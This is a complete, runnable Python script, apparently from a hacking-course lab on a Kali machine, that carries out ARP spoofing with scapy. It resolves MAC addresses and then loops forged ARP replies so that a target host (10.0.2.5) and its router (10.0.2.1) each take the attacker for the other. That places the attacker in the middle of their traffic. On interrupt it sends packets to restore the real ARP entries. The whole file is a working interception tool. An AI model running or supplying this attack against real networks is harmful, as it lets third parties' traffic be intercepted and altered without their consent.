#!/usr/bin/env python3

import scapy.all as scapy
from scapy.packet import Packet
from time import sleep
import sys

def scan_to_get_mac_address(ip):
  '''
  Parameters
  ----------
  ip : str
    The ip we need to get the mac address
  '''

  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_req_broadcast = broadcast/arp_request
  answered, unanswered = scapy.srp(arp_req_broadcast, timeout=1)

  answer = answered[0]
  client_dict = {"ip": answer[1].psrc, "mac": answer[1].hwsrc}

  return client_dict["mac"]

def spoof(target_ip, spoof_ip):
  '''
  Parameters
  ----------
  target_ip : str
    The ip we wabt to fool
  spoof_ip: str
    The ip we pretend to be
  '''

  target_mac = scan_to_get_mac_address(target_ip)
  # this packets by default set mac address of the source (hwsrc) as the kali machine mac address
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
  scapy.send(packet, verbose=0)

def restore(target_ip, source_ip):
  '''
  Parameters
  ----------
  target_ip : str
    The ip we want to fool
  source_ip: str
    The ip we want to restore
  '''

  target_mac = scan_to_get_mac_address(target_ip)
  source_mac = scan_to_get_mac_address(source_ip)
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
  scapy.send(packet, verbose=0)

def test():
  # op: send as respone not request
  #                              target ip        target MAC                source of the packet 
  #                                                                         (in this case simulate the router)
  packet = scapy.ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:44:9a:d7", psrc="10.0.2.1")
  # print(packet.show())
  # print(packet.summary())
  scapy.send(packet)

def sending_packets(target_ip, router_ip):
  packets_counter = 0
  while(True):
    # fool the target machine telling i'm the router
    spoof(target_ip, router_ip)
    # fool the router telling it i'm the target machine
    spoof(router_ip, target_ip)
    packets_counter += 2
    print(f'\rPackets send: {packets_counter}', end='')
    sleep(2)

def restore_packets(target_ip, router_ip):
  # telling to the target machine telling who is the router
  restore(target_ip, router_ip)
  # telling to the router telling who is the target machine
  restore(router_ip, target_ip)

def main():
  target_ip = "10.0.2.5"
  router_ip = "10.0.2.1"

  try:
    sending_packets(target_ip, router_ip)
  except KeyboardInterrupt:
    restore_packets(target_ip, router_ip)
    print("Program terminated by user")
  except Exception:
    restore_packets(target_ip, router_ip)
    print(Exception)

if __name__ == "__main__":
  # set verbose for scapy
  scapy.conf.verb = 0
  main()
